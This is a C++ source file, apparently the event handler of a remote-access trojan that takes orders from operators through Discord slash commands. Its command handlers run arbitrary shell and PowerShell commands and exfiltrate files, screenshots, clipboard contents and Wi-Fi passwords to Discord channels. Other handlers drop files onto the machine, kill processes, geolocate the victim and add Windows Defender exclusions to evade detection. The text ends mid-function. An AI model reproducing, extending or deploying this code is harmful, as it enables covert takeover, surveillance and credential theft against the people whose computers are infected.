#define NOMINMAX
#include "core/EventHandler.h"
#include "commands/CmdUtils.h"
#include "agents/dead_agent_manager.h"
#include <thread>
#include <chrono>
#include <regex>

#ifdef ENABLE_SCREENSHOT
#include "commands/Screenshot.h"
#endif
#ifdef ENABLE_WIFI
#include "commands/wifiProfiles.h"
#endif
#ifdef ENABLE_CLIPBOARD
#include "commands/Clipboard.h"
#endif
#ifdef ENABLE_APPLICATIONS
#include "commands/Applications.h"
#endif
#ifdef ENABLE_SYSINFO
#include "commands/sysinfo.h"
#endif
#ifdef ENABLE_PROCESSES
#include "commands/ProcessList.h"
#endif
#ifdef ENABLE_DEFENDER_EXCLUSION
#include "commands/DefenderExclusion.h"
#endif
#ifdef ENABLE_LOCATION
#include "commands/Location.h"
#endif

EventHandler::EventHandler(
    DiscordClient& discordClient,
    const config::BotConfig& cfg,
    HttpClient& httpClient,
    WebSocketClient& wsClient,
    CommandHandler& cmdHandler,
    FileUtils& fileUtils,
    const std::string& commandsChannelId
)
    : discordClient_(discordClient),
    cfg_(cfg),
    httpClient(httpClient),
    wsClient(wsClient),
    cmdHandler(cmdHandler),
    fileUtils(fileUtils),
    commands_channel_id(commandsChannelId),
    heartbeatIntervalMs(0)
{
}

void EventHandler::ProcessEvents(bool& running) {
    std::thread* heartbeatThread = nullptr;
    while (running) {
        std::string payload = wsClient.Receive();
        if (payload.empty()) continue;
        if (payload == "DISCONNECTED") {
            if (heartbeatThread) {
                heartbeatThread->detach();
                delete heartbeatThread;
                heartbeatThread = nullptr;
            }
            break;
        }

        try {
            json root = json::parse(payload);
            if (root["t"].is_string() && root["t"] == "INTERACTION_CREATE") {
                std::string id = root["d"]["id"].get<std::string>();
                std::string token = root["d"]["token"].get<std::string>();
                std::string channel_id = root["d"]["channel_id"].get<std::string>();

                if (root["d"]["data"]["type"].is_number() && root["d"]["data"]["type"] == 1) {
                    std::string commandName = root["d"]["data"]["name"].get<std::string>();

                    if (commandName == "runcmd") {
                        if (channel_id != commands_channel_id) {
                            std::cout << "Ignoring /runcmd from channel " << channel_id << " (expected: " << commands_channel_id << ")" << std::endl;
                            continue;
                        }

                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string task = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /runcmd with agentid: " << agentId << ", task: " << task << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);
                        std::string output = ExecuteCommand(task);
                        std::vector<std::string> outputChunks = SplitAndSanitizeOutput(output, 1900, 5);

                        std::string firstMessage = "**Agent " + std::to_string(agentId) + "**:\n```\n" + outputChunks[0] + "\n```";
                        json response = { {"content", firstMessage} };
                        SendFollowUp(token, response.dump());

                        for (size_t i = 1; i < outputChunks.size(); ++i) {
                            std::string additionalMessage = "**Agent " + std::to_string(agentId) + "** (Part " + std::to_string(i + 1) + "):\n```\n" + outputChunks[i] + "\n```";
                            SendChannelMessage(commands_channel_id, additionalMessage);
                        }
                    }
                    else if (commandName == "runcmd-all" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string task = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t designatedAgentId = std::stoll(agentIdStr);

                        std::cout << "Received /runcmd-all with designated agentid: " << designatedAgentId << ", task: " << task << std::endl;

                        if (config::cfg.agent_id == designatedAgentId) {
                            RespondDeferred(id, token);
                            std::cout << "Designated beacon " << config::cfg.agent_id << " acknowledged interaction" << std::endl;
                            json response = { {"content", "Command sent to all beacons"} };
                            SendFollowUp(token, response.dump());
                        }
                        else {
                            std::cout << "Non-designated beacon " << config::cfg.agent_id << " skipping acknowledgment" << std::endl;
                        }

                        std::string output = ExecuteCommand(task);
                        std::vector<std::string> outputChunks = SplitAndSanitizeOutput(output, 1900, 5);

                        std::srand(static_cast<unsigned int>(std::time(nullptr) + config::cfg.agent_id));
                        int delayMs = std::rand() % 5000;
                        std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));

                        for (size_t i = 0; i < outputChunks.size(); ++i) {
                            std::string partLabel = (outputChunks.size() > 1) ? " (Part " + std::to_string(i + 1) + ")" : "";
                            std::string formattedMessage = "**Agent " + std::to_string(config::cfg.agent_id) + "**" + partLabel + ":\n```\n" + outputChunks[i] + "\n```";
                            SendChannelMessage(commands_channel_id, formattedMessage);
                        }
                    }
#ifdef ENABLE_DOWNLOAD
                    else if (commandName == "download" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string filePath = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /download with agentid: " << agentId << ", file: " << filePath << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        std::string fileContent;
                        std::string errorMessage;
                        bool success = fileUtils.PrepareLocalFileUpload(filePath, agentIdStr, fileContent, errorMessage);
                        json embed;

                        if (!success) {
                            embed = {
                                {"title", "**File Download Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\n" + errorMessage},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                            json response = { {"content", ""}, {"embeds", {embed}} };
                            SendFollowUp(token, response.dump());
                        }
                        else {
                            std::string messageContent = "**Agent " + agentIdStr + "**: Uploading file " + filePath;
                            if (SendChannelMessage(config::cfg.download_chanel_id, messageContent, filePath, fileContent)) {
                                embed = {
                                    {"title", "**File Download Successful**"},
                                    {"description", "Agent ID: " + agentIdStr + "\nFile uploaded to download channel: " + filePath},
                                    {"color", 0x00FF00},
                                    {"footer", {{"text", "Success"}}}
                                };
                            }
                            else {
                                embed = {
                                    {"title", "**File Download Failed**"},
                                    {"description", "Agent ID: " + agentIdStr + "\nFailed to upload file to download channel"},
                                    {"color", 0xFF0000},
                                    {"footer", {{"text", "Error"}}}
                                };
                            }
                            json response = { {"content", ""}, {"embeds", {embed}} };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_UPLOAD
                    else if (commandName == "upload" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string destination = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /upload with agentid: " << agentId << ", destination: " << destination << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);
                        std::wstring endpoint = L"https://discord.com/api/v10/channels/" + std::wstring(config::cfg.upload_chanel_id.begin(), config::cfg.upload_chanel_id.end()) + L"/messages?limit=50";
                        std::string response;
                        json embed;

                        if (!httpClient.SendRequest(endpoint, "", config::cfg.token, "GET", "application/json", &response)) {
                            embed = {
                                {"title", "**File Upload Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\nFailed to fetch messages from upload channel"},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                            json responseJson = { {"content", ""}, {"embeds", {embed}} };
                            SendFollowUp(token, responseJson.dump());
                            continue;
                        }

                        std::string fileUrl, messageId, errorMessage;
                        if (!fileUtils.DownloadAndSaveFile(response, destination, agentIdStr, fileUrl, messageId, errorMessage)) {
                            embed = {
                                {"title", "**File Upload Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\n" + errorMessage},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                            json responseJson = { {"content", ""}, {"embeds", {embed}} };
                            SendFollowUp(token, responseJson.dump());
                            continue;
                        }

                        std::wstring wFileUrl(fileUrl.begin(), fileUrl.end());
                        std::string fileContent;
                        if (!httpClient.SendRequest(wFileUrl, "", "", "GET", "application/octet-stream", &fileContent)) {
                            embed = {
                                {"title", "**File Upload Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\nFailed to download file from " + fileUrl},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                            json responseJson = { {"content", ""}, {"embeds", {embed}} };
                            SendFollowUp(token, responseJson.dump());
                            continue;
                        }

                        if (!fileUtils.SaveFileContent(destination, fileContent, errorMessage)) {
                            embed = {
                                {"title", "**File Upload Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\nFailed to write to " + destination + ": " + errorMessage},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                            json responseJson = { {"content", ""}, {"embeds", {embed}} };
                            SendFollowUp(token, responseJson.dump());
                            continue;
                        }

                        std::wstring deleteEndpoint = L"https://discord.com/api/v10/channels/" + std::wstring(config::cfg.upload_chanel_id.begin(), config::cfg.upload_chanel_id.end()) +
                            L"/messages/" + std::wstring(messageId.begin(), messageId.end());
                        if (!httpClient.SendRequest(deleteEndpoint, "", config::cfg.token, "DELETE")) {
                            std::cerr << "Failed to delete message " << messageId << " from upload channel" << std::endl;
                        }

                        embed = {
                            {"title", "**File Upload Successful**"},
                            {"description", "Agent ID: " + agentIdStr + "\nFile uploaded to " + destination + " and removed from channel"},
                            {"color", 0x00FF00},
                            {"footer", {{"text", "Success"}}}
                        };
                        json responseJson = { {"content", ""}, {"embeds", {embed}} };
                        SendFollowUp(token, responseJson.dump());
                        }
#endif
#ifdef ENABLE_SCREENSHOT
                    else if (commandName == "screenshot" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /screenshot with agentid: " << agentId << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);
                        std::string filePath = "screenshot_" + std::to_string(agentId) + "_" + std::to_string(std::time(nullptr)) + ".png";
                        if (CaptureScreenshot(filePath)) {
                            std::ifstream file(filePath, std::ios::binary);
                            if (!file.is_open()) {
                                SendFollowUp(token, json{ {"content", "**Agent " + agentIdStr + "**: Failed to open screenshot file"} }.dump());
                                continue;
                            }
                            std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                            file.close();

                            std::string messageContent = "**Agent " + agentIdStr + "**: Screenshot captured";
                            if (SendChannelMessage(commands_channel_id, messageContent, filePath, fileContent)) {
                                SendFollowUp(token, json{ {"content", "**Agent " + agentIdStr + "**: Screenshot uploaded successfully"} }.dump());
                            }
                            else {
                                SendFollowUp(token, json{ {"content", "**Agent " + agentIdStr + "**: Failed to upload screenshot"} }.dump());
                            }

                            std::remove(filePath.c_str());
                        }
                        else {
                            SendFollowUp(token, json{ {"content", "**Agent " + agentIdStr + "**: Failed to capture screenshot"} }.dump());
                        }
                    }
#endif
#ifdef ENABLE_WIFI
                    else if (commandName == "wifi" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /wifi with agentid: " << agentId << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        std::vector<std::pair<std::string, std::string>> wifiProfiles = ExtractWifiPasswords();
                        json embed;

                        if (wifiProfiles.empty()) {
                            embed = {
                                {"title", "**Wi-Fi Profiles Retrieval Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\nNo Wi-Fi profiles found or access denied."},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                        }
                        else {
                            std::string profilesList;
                            for (const auto& [name, password] : wifiProfiles) {
                                profilesList += "**" + name + "**: ``" + password + "``\n";
                            }
                            embed = {
                                {"title", "**Wi-Fi Profiles Retrieved Successfully**"},
                                {"description", "Agent ID: " + agentIdStr + "\n\n**Profiles**\n" + profilesList},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };
                        }

                        json response = {
                            {"content", ""},
                            {"embeds", {embed}}
                        };
                        SendFollowUp(token, response.dump());
                    }
#endif
#ifdef ENABLE_CLIPBOARD
                    else if (commandName == "clipboard" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /clipboard with agentid: " << agentId << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        std::string clipboardData = GetClipboardData();
                        json embed;

                        if (clipboardData.empty()) {
                            embed = {
                                {"title", "**Clipboard Retrieval Failed**"},
                                {"description", "Agent ID: " + agentIdStr + "\nNo clipboard data found or access denied."},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };
                        }
                        else {
                            embed = {
                                {"title", "**Clipboard Retrieved Successfully**"},
                                {"description", "Agent ID: " + agentIdStr + "\n\n**Clipboard Contents**\n```clip\n" + clipboardData + "\n```"},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };
                        }

                        json response = {
                            {"content", ""},
                            {"embeds", {embed}}
                        };
                        SendFollowUp(token, response.dump());
                    }
#endif
#ifdef ENABLE_APPLICATIONS
                    else if (commandName == "applications" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /applications with agentid: " << agentId << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        std::string userProfile = GetUserProfile();
                        std::unordered_map<std::string, std::string> installedApps = GetInstalledApplications(userProfile);
                        bool success = !userProfile.empty();
                        std::string payload = CreateJSONPayload(installedApps, agentIdStr, success);

                        json response = json::parse(payload);
                        SendFollowUp(token, response.dump());
                    }
#endif
#ifdef ENABLE_SYSINFO
                    else if (commandName == "sysinfo" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /sysinfo with agentid: " << agentId << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        std::unordered_map<std::string, std::string> sysInfo = GetSystemInfo();
                        bool success = !sysInfo.empty();
                        std::string payload = CreateJSONPayload2(sysInfo, agentIdStr, success);

                        json response = json::parse(payload);
                        SendFollowUp(token, response.dump());
                    }
#endif
#ifdef ENABLE_PROCESSES
                    else if (commandName == "ps" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);
                        std::string options = "all";
                        if (root["d"]["data"]["options"].size() > 1) {
                            options = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        }

                        std::cout << "Received /ps with agentid: " << agentId << " and options: " << options << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        bool appsOnly = (options == "apps");
                        std::unordered_map<std::string, std::string> processes = GetRunningProcesses(appsOnly);
                        bool success = !processes.empty();

                        std::string content;
                        int partNumber = 1;
                        for (const auto& [pid, name] : processes) {
                            std::string line = "PID: " + pid + " - " + name + "\n";
                            if (content.size() + line.size() > 1900) {
                                json embed = {
                                    {"embeds", json::array({
                                        {{"title", "Running Processes (" + options + ") - Part " + std::to_string(partNumber++)},
                                         {"description", content},
                                         {"color", success ? 65280 : 16711680}}
                                    })}
                                };
                                SendFollowUp(token, embed.dump());
                                content.clear();
                            }
                            content += line;
                        }

                        if (!content.empty()) {
                            json embed = {
                                {"embeds", json::array({
                                    {{"title", "Running Processes (" + options + ") - Part " + std::to_string(partNumber)},
                                     {"description", content},
                                     {"color", success ? 65280 : 16711680}}
                                })}
                            };
                            SendFollowUp(token, embed.dump());
                        }

                        if (processes.empty()) {
                            json embed = {
                                {"embeds", json::array({
                                    {{"title", "Running Processes (" + options + ")"},
                                     {"description", "No processes found."},
                                     {"color", 16711680}}
                                })}
                            };
                            SendFollowUp(token, embed.dump());
                        }
                    }
#endif
#ifdef ENABLE_REREGISTER
                    else if (commandName == "re-register" && channel_id == commands_channel_id) {
                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        std::cout << "Received /re-register command" << std::endl;

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        try {
                            std::this_thread::sleep_for(std::chrono::seconds(5));
                            auto uniqueAgentIds = get_unique_agent_ids(cfg_);
                            std::this_thread::sleep_for(std::chrono::seconds(5));
                            discordClient_.RegisterCommands(uniqueAgentIds);

                            json embed = {
                                {"title", "**Commands Re-registered**"},
                                {"description", "All commands have been successfully re-registered for all agents."},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                        catch (const std::exception& e) {
                            json embed = {
                                {"title", "**Re-registration Failed**"},
                                {"description", "Error: " + std::string(e.what())},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Error"}}}
                            };

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_CLEANDEAD
                    else if (commandName == "clean-dead" && channel_id == commands_channel_id) {
                        std::cout << "Received /clean-dead command" << std::endl;

                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        try {
                            std::string beaconChannelId = cfg_.beacon_chanel_id;
                            std::vector<std::pair<std::string, std::string>> messages = GetMessagesFromChannel(cfg_.token, beaconChannelId);

                            if (messages.empty()) {
                                json embed = {
                                    {"title", "Clean Dead Agents"},
                                    {"description", "Agent ID: " + std::to_string(cfg_.agent_id)},
                                    {"fields", {{
                                        {"name", "Result"},
                                        {"value", "```\nNo messages found in the beacon channel or failed to fetch messages\n```"},
                                        {"inline", false}
                                    }}},
                                    {"color", 0x00FF00},
                                    {"footer", {{"text", "Success"}}}
                                };

                                json response = {
                                    {"content", ""},
                                    {"embeds", {embed}}
                                };
                                SendFollowUp(token, response.dump());
                                return;
                            }

                            int deletedCount = 0;
                            int failedCount = 0;
                            std::string failedIds;

                            for (const auto& msg : messages) {
                                const std::string& messageId = msg.first;
                                const std::string& content = msg.second;

                                if (content.find("[Embedded Content]") != std::string::npos &&
                                    content.find("Agent #~~") != std::string::npos) {
                                    bool success = DeleteDiscordMessage(cfg_.token, beaconChannelId, messageId);
                                    if (success) {
                                        deletedCount++;
                                        std::this_thread::sleep_for(std::chrono::milliseconds(200));
                                        std::cout << "Deleted dead agent message ID: " << messageId << std::endl;
                                    }
                                    else {
                                        failedCount++;
                                        if (!failedIds.empty()) failedIds += ", ";
                                        failedIds += messageId;
                                        std::cout << "Failed to delete message ID: " << messageId << std::endl;
                                    }
                                }
                            }

                            json embed = {
                                {"title", "Clean Dead Agents"},
                                {"description", "Agent ID: " + std::to_string(cfg_.agent_id)},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };

                            embed["fields"] = json::array({
                                {{"name", "Deleted"}, {"value", "```\n" + std::to_string(deletedCount) + " dead agent messages\n```"}, {"inline", true}},
                                {{"name", "Failed"}, {"value", "```\n" + std::to_string(failedCount) + " messages\n```"}, {"inline", true}}
                                });

                            const size_t maxFieldLength = 1024;
                            const size_t codeBlockOverhead = 8;
                            if (failedCount > 0) {
                                std::string formattedFailedIds = failedIds;
                                if (formattedFailedIds.length() + codeBlockOverhead > maxFieldLength) {
                                    formattedFailedIds = formattedFailedIds.substr(0, maxFieldLength - codeBlockOverhead - 20) + "... [truncated]";
                                }
                                embed["fields"].push_back({
                                    {"name", "Failed Message IDs"},
                                    {"value", "```\n" + formattedFailedIds + "\n```"},
                                    {"inline", false}
                                    });
                            }
                            else {
                                std::string result = deletedCount > 0 ? "Successfully cleaned up dead agents" : "No dead agents found";
                                embed["fields"].push_back({
                                    {"name", "Result"},
                                    {"value", "```\n" + result + "\n```"},
                                    {"inline", false}
                                    });
                            }

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                        catch (const std::exception& e) {
                            json embed = {
                                {"title", "Clean Dead Failed"},
                                {"description", "Agent ID: " + std::to_string(cfg_.agent_id)},
                                {"fields", {{
                                    {"name", "Error"},
                                    {"value", "```\n" + std::string(e.what()) + "\n```"},
                                    {"inline", false}
                                }}},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Success"}}}
                            };

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_LOCATION
                    else if (commandName == "location" && channel_id == commands_channel_id) {
                        std::cout << "Received /location command" << std::endl;

                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        try {
                            std::string ip = getPublicIP();
                            std::cout << "IP from getPublicIP: " << ip << std::endl;
                            std::string country, city, mapUrl;
                            double lat, lon;
                            bool success = LocationUtils::GetLocationData(ip, country, city, mapUrl, lat, lon);

                            json embed = {
                                {"title", "Agent Location"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id)},
                                {"color", success ? 0x00FF00 : 0xFF0000},
                                {"footer", {{"text", success ? "Success | Lat: " + std::to_string(lat).substr(0, 7) + ", Lon: " + std::to_string(lon).substr(0, 7) : "Failed"}}}
                            };

                            if (success) {
                                std::string osmLink = "https://www.openstreetmap.org/#map=10/" + std::to_string(lat) + "/" + std::to_string(lon);
                                embed["fields"] = json::array({
                                    {{"name", "Public IP"}, {"value", "```\n" + ip + "\n```"}, {"inline", true}},
                                    {{"name", "Country"}, {"value", "```\n" + country + "\n```"}, {"inline", true}},
                                    {{"name", "City"}, {"value", "```\n" + city + "\n```"}, {"inline", true}},
                                    {{"name", "Interactive Map"}, {"value", "[View on OpenStreetMap](" + osmLink + ")"}, {"inline", false}}
                                    });
                                embed["image"] = { {"url", mapUrl} };
                            }
                            else {
                                embed["fields"] = json::array({
                                    {{"name", "Error"}, {"value", "```\nFailed to retrieve location data\n```"}, {"inline", false}},
                                    {{"name", "Public IP"}, {"value", "```\n" + ip + "\n```"}, {"inline", false}}
                                    });
                            }

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                        catch (const std::exception& e) {
                            json embed = {
                                {"title", "Location Retrieval Failed"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id)},
                                {"fields", {{
                                    {"name", "Error"},
                                    {"value", "```\n" + std::string(e.what()) + "\n```"},
                                    {"inline", false}
                                }}},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Failed"}}}
                            };
                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_KILL
                    else if (commandName == "kill" && channel_id == commands_channel_id) {
                        std::cout << "Received /kill command" << std::endl;

                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string processName = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        try {
                            std::string error;
                            bool success = CmdUtils::KillProcess(processName, error);

                            json embed = {
                                {"title", "Process Termination"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id)},
                                {"color", success ? 0x00FF00 : 0xFF0000},
                                {"footer", {{"text", success ? "Success" : "Failed"}}}
                            };

                            std::string resultField = success ? "Process terminated successfully" : error;
                            const size_t maxFieldLength = 1024;
                            const size_t codeBlockOverhead = 8;
                            if (resultField.length() + codeBlockOverhead > maxFieldLength) {
                                resultField = resultField.substr(0, maxFieldLength - codeBlockOverhead - 20) + "... [truncated]";
                            }

                            embed["fields"] = json::array({
                                {
                                    {"name", success ? "Result" : "Error"},
                                    {"value", "```\n" + (resultField.empty() ? "No output" : resultField) + "\n```"},
                                    {"inline", false}
                                },
                                {
                                    {"name", "Process"},
                                    {"value", "```\n" + processName + "\n```"},
                                    {"inline", false}
                                }
                                });

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                        catch (const std::exception& e) {
                            json embed = {
                                {"title", "Process Termination Failed"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id)},
                                {"fields", {{
                                    {"name", "Error"},
                                    {"value", "```\n" + std::string(e.what()) + "\n```"},
                                    {"inline", false}
                                }}},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Failed"}}}
                            };

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_POWERSHELL
                    else if (commandName == "powershell" && channel_id == commands_channel_id) {
                        std::cout << "Received /powershell command" << std::endl;

                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string psCommand = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        try {
                            std::string output;
                            std::string error;
                            bool success = CmdUtils::ExecutePowerShellCommand(psCommand, output, error);

                            json embed = {
                                {"title", "PowerShell Command Execution"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id)},
                                {"color", success ? 0x00FF00 : 0xFF0000},
                                {"footer", {{"text", success ? "Success" : "Failed"}}}
                            };

                            std::string resultField = success ? output : error;
                            const size_t maxFieldLength = 1024;
                            const size_t codeBlockOverhead = 8;
                            if (resultField.length() + codeBlockOverhead > maxFieldLength) {
                                resultField = resultField.substr(0, maxFieldLength - codeBlockOverhead - 20) + "... [truncated]";
                            }

                            embed["fields"] = json::array({
                                {
                                    {"name", success ? "Output" : "Error"},
                                    {"value", "```\n" + (resultField.empty() ? "No output" : resultField) + "\n```"},
                                    {"inline", false}
                                },
                                {
                                    {"name", "Command"},
                                    {"value", "```\n" + psCommand + "\n```"},
                                    {"inline", false}
                                }
                                });

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                        catch (const std::exception& e) {
                            json embed = {
                                {"title", "PowerShell Command Failed"},
                                {"description", "Agent ID: " + std::to_string(config::cfg.agent_id)},
                                {"fields", {{
                                    {"name", "Error"},
                                    {"value", "```\n" + std::string(e.what()) + "\n```"},
                                    {"inline", false}
                                }}},
                                {"color", 0xFF0000},
                                {"footer", {{"text", "Failed"}}}
                            };

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                    }
#endif
#ifdef ENABLE_DEFENDER_EXCLUSION
                    else if (commandName == "defender-exclusion" && channel_id == commands_channel_id) {
                        std::cout << "Received /defender-exclusion command" << std::endl;

                        std::string agentIdStr = root["d"]["data"]["options"][0]["value"].get<std::string>();
                        std::string path = root["d"]["data"]["options"][1]["value"].get<std::string>();
                        int64_t agentId = std::stoll(agentIdStr);

                        if (agentId != config::cfg.agent_id) {
                            std::cout << "Dropping command: agentid " << agentId << " does not match local agent_id " << config::cfg.agent_id << std::endl;
                            continue;
                        }

                        RespondDeferred(id, token);

                        std::string statusContents;
                        bool success = commands::AddDefenderExclusion(path, statusContents);

                        if (success) {
                            json embed = {
                                {"title", "Defender Exclusion"},
                                {"description", "Agent ID: " + agentIdStr},
                                {"color", 0x00FF00},
                                {"footer", {{"text", "Success"}}}
                            };

                            embed["fields"] = json::array({
                                {{"name", "Status"}, {"value", "```\n" + statusContents + "\n```"}, {"inline", false}}
                                });

                            json response = {
                                {"content", ""},
                                {"embeds", {embed}}
                            };
                            SendFollowUp(token, response.dump());
                        }
                        else {
                            json embed = {
                                {"title", "Defender Exclusion Failed"},
                                {"description", "Agent ID: " + agentIdStr},
                                {"fields", {{
                                    {"name", "Status"},
